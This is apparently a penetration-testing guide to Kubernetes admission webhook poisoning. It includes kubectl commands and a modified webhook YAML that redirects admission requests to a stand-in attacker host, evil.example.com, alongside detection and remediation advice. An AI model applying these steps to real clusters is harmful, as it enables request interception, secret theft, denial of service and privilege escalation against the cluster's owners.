
# Kubernetes Admission Controller Webhook Poisoning

## 1. Overview

**Attack Vector Description:**

Admission controllers are Kubernetes components that intercept requests to the API server before persistence of the object, but after the request is authenticated and authorized. Admission controllers can be configured as webhooks, which are external services that receive admission review requests.  Webhook poisoning occurs when an attacker is able to manipulate the configuration of these webhooks (either by modifying the webhook's URL, certificate authority data, or defining a policy that applies to all requests) to redirect traffic to a malicious endpoint or to completely bypass security controls. This allows the attacker to potentially deploy malicious workloads, modify existing resources, or escalate privileges within the cluster.

**Potential Impact and Consequences:**

*   **Arbitrary Code Execution:** Deploying malicious pods that execute code within the cluster.
*   **Data Exfiltration:** Accessing and stealing sensitive data stored in Kubernetes secrets or persistent volumes.
*   **Privilege Escalation:** Gaining cluster administrator privileges, allowing full control of the cluster.
*   **Denial of Service:** Crashing or disrupting the cluster's control plane.
*   **Resource Hijacking:** Using the cluster's resources for cryptocurrency mining or other malicious activities.

**Risk Level Assessment:**

Critical

**Technical Explanation of Why This Vulnerability Exists:**

This vulnerability exists because of insufficient access control and validation around the configuration of admission controller webhooks. If an attacker gains write access to the `ValidatingWebhookConfiguration` or `MutatingWebhookConfiguration` resources, they can modify the webhook configuration to point to a malicious endpoint.  Additionally, overly permissive policies, such as those that apply to all namespaces or all resources, increase the attack surface.  A lack of mutual TLS verification for the webhook endpoints can allow man-in-the-middle attacks.

**Prerequisites and Conditions Needed:**

*   **Kubernetes Cluster:** A running Kubernetes cluster with at least one admission controller webhook configured.
*   **Sufficient Permissions:** The attacker must have `create`, `update`, and `delete` permissions on `ValidatingWebhookConfiguration` or `MutatingWebhookConfiguration` resources.  This often means having a role bound to the `cluster-admin` role or a similarly privileged role.  Alternatively, compromised service account with these permissions can also lead to this attack.
*   **Network Access (Optional):** If the malicious webhook endpoint is hosted outside the cluster, the attacker needs network access from the cluster to the malicious endpoint.

## 2. Validation and Exploitation Steps

### 2.1. Discovery: Identifying Webhooks

The first step is to identify existing admission controller webhooks in the cluster.

```bash
kubectl get validatingwebhookconfiguration -o yaml
```

```bash
kubectl get mutatingwebhookconfiguration -o yaml
```

**Explanation:**

These commands retrieve the YAML definitions of all validating and mutating webhook configurations.  `validatingwebhookconfiguration` defines webhooks that validate resource requests, while `mutatingwebhookconfiguration` defines webhooks that can modify resource requests.

**Expected Output:**

YAML output containing the configuration details for each webhook, including its name, URL, client configuration, and rules.

**What to Look For:**

*   The names of the webhooks.
*   The `clientConfig.url` field, which specifies the URL of the webhook endpoint.
*   The `clientConfig.caBundle` field, which contains the certificate authority data used to verify the webhook server's certificate (if present).  Absence of this is a red flag.
*   The `rules` field, which specifies the resources and operations that the webhook applies to. Overly broad rules (e.g., `operations: ["CREATE", "UPDATE", "DELETE"]` on all `resources`) increase the potential impact.
*   Presence of service account tokens.

### 2.2. Validation: Checking Permissions

Verify that you have the necessary permissions to modify webhook configurations.

```bash
kubectl auth can-i update validatingwebhookconfiguration
```

```bash
kubectl auth can-i update mutatingwebhookconfiguration
```

**Explanation:**

These commands use `kubectl auth can-i` to check if the current user/service account has the `update` permission on the specified resources.

**Expected Output:**

*   `yes`: Indicates that you have the required permissions.
*   `no`: Indicates that you lack the required permissions and this attack is not directly possible.

**What to Look For:**

Confirmation that you have the `update` permission.  If not, further privilege escalation may be required before proceeding.

### 2.3. Exploitation: Poisoning the Webhook

If you have the necessary permissions, you can poison the webhook by modifying its configuration. First, extract the current configuration:

```bash
kubectl get validatingwebhookconfiguration <webhook-name> -o yaml > original_webhook.yaml
```

**Explanation:**

This command retrieves the YAML definition of a specific validating webhook (replace `<webhook-name>` with the actual name found in Step 2.1) and saves it to a file named `original_webhook.yaml`.  This is important for restoring the original configuration later.  You will have to perform this step for any webhook you wish to poison.

**Expected Output:**

The command will create a file named `original_webhook.yaml` containing the webhook's configuration.

**What to Look For:**

Successful creation of the `original_webhook.yaml` file.

Next, modify the webhook configuration to point to a malicious endpoint.  For demonstration, we'll assume you have a simple HTTP server running at `http://evil.example.com:8080` that will log the incoming requests. We will change the url field in our `original_webhook.yaml` file with this information. This could be a webhook designed to drop all admission requests or inject malicious code into pods.  If `caBundle` is present, you can either remove it (for maximum impact, if the validating webhook does not check the certificate) or replace it with invalid data. If the webhook uses service account authentication, it might be possible to compromise the service account associated with the validating webhook.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: <webhook-name>
webhooks:
- admissionReviewVersions:
  - "v1"
  clientConfig:
    url: "http://evil.example.com:8080" # Modified URL
    service: null #Ensure service field is null to prevent errors
  failurePolicy: Fail #Ensure failure policy is set to fail so all requests fail
  matchPolicy: Exact
  name: webhook.example.com
  namespaceSelector: {}
  objectSelector: {}
  rules:
  - apiGroups:
    - "*"
    apiVersions:
    - "*"
    operations:
    - CREATE
    - UPDATE
    resources:
    - pods
    scope: "*"
  sideEffects: None
  timeoutSeconds: 10
```

Now, apply the modified configuration:

```bash
kubectl apply -f modified_webhook.yaml
```

**Explanation:**

This command applies the modified YAML file to update the webhook configuration in the cluster.

**Expected Output:**

The command should output a message indicating that the webhook configuration has been updated.  Example: `validatingwebhookconfiguration.admissionregistration.k8s.io/<webhook-name> configured`

**What to Look For:**

Successful configuration of the modified webhook.

Now, attempt to create a resource that the webhook applies to (e.g., a pod).

```bash
kubectl run test-pod --image=nginx
```

**Explanation:**

This command attempts to create a simple `nginx` pod.  Since the webhook is now pointing to a malicious endpoint, the request should be intercepted and sent to `evil.example.com:8080`.

**Expected Output:**

*   If the malicious endpoint is configured to reject all requests (as we've assumed with `failurePolicy: Fail`), the pod creation will fail with an error message related to the webhook.  This confirms that the webhook is successfully intercepting the request.  The malicious endpoint's logs should show the admission review request.
*   If the malicious endpoint is configured to allow all requests, the pod will be created successfully, bypassing the intended security controls. However, the server logs will still contain the admission review request.
*   If the malicious endpoint is unavailable, the pod creation will fail.

**What to Look For:**

Confirmation that the request is being sent to the malicious endpoint and that the behavior of the cluster is being affected (either by failing or bypassing security controls). The logs of `evil.example.com:8080` will verify that the admission review request has been received.

### 2.4. Exploitation: Further Possibilities

Depending on the malicious endpoint's capabilities, you can further exploit the poisoned webhook. Examples:

*   **Deny all requests:** The malicious endpoint can simply reject all requests, causing a denial-of-service condition.
*   **Modify requests:** The malicious endpoint can modify the requests before forwarding them to the API server, potentially injecting malicious code into pods or changing resource configurations. This is useful for mutating webhooks.
*   **Log sensitive data:** The malicious endpoint can log sensitive data contained in the admission review request, such as secrets or configuration data.
*   **Grant Elevated Permissions:** The malicious endpoint can modify resource requests to grant elevated permissions to unauthorized users or service accounts, leading to privilege escalation.

### 2.5. Cleanup: Restoring the Original Configuration

After validating the vulnerability, it's essential to restore the original webhook configuration.

```bash
kubectl apply -f original_webhook.yaml
```

**Explanation:**

This command applies the original YAML file that was saved earlier, restoring the webhook to its previous state.

**Expected Output:**

The command should output a message indicating that the webhook configuration has been updated.

**What to Look For:**

Successful restoration of the original webhook configuration. Verify by describing the resource:

```bash
kubectl describe validatingwebhookconfiguration <webhook-name>
```

Confirm the configuration is restored.

### 2.6 Detection

* Monitor changes to `ValidatingWebhookConfiguration` and `MutatingWebhookConfiguration` resources.
* Implement auditing on API server access to track who is modifying webhook configurations.
* Implement mutual TLS authentication between the API server and the webhook endpoints.
* Regularly review and audit the rules defined in the webhook configurations to ensure they are not overly broad.

## Remediation Recommendations:

1.  **Least Privilege Principle:**  Enforce the principle of least privilege by granting users and service accounts only the necessary permissions. Restrict access to `ValidatingWebhookConfiguration` and `MutatingWebhookConfiguration` resources to authorized personnel only.
2.  **Input Validation:**  Implement rigorous input validation on the webhook endpoint to prevent malicious data from being injected into the cluster.
3.  **Mutual TLS Authentication:**  Enable mutual TLS authentication between the API server and the webhook endpoint to ensure that only authorized clients can access the webhook.  Verify the client certificate on the webhook server.
4.  **Regular Audits:**  Conduct regular audits of webhook configurations to identify and address potential vulnerabilities.  Review the rules defined in the webhooks to ensure they are not overly permissive.
5.  **Monitoring and Alerting:**  Implement monitoring and alerting mechanisms to detect suspicious activity related to webhook configurations.  Alert on any unauthorized modifications to the webhook configurations.
6.  **Immutable Infrastructure:** Utilize Infrastructure as Code (IaC) practices to define webhook configurations, allowing them to be easily tracked and rolled back to a known good state in case of a breach.
7.  **RBAC Hardening:** Tighten Role-Based Access Control (RBAC) policies. Ensure service accounts used by webhooks have minimal necessary permissions. Avoid assigning cluster-admin roles unnecessarily.
8.  **Webhook Certificate Rotation:** Regularly rotate certificates used for TLS between the Kubernetes API server and webhooks. Implement automated certificate management tools to streamline this process.

This thorough documentation provides a clear understanding of the webhook poisoning vulnerability, along with practical steps for validating and exploiting it, and recommendations for remediation. It also addresses potential variations and alternative approaches, ensuring its usefulness for penetration testing and security assessments.
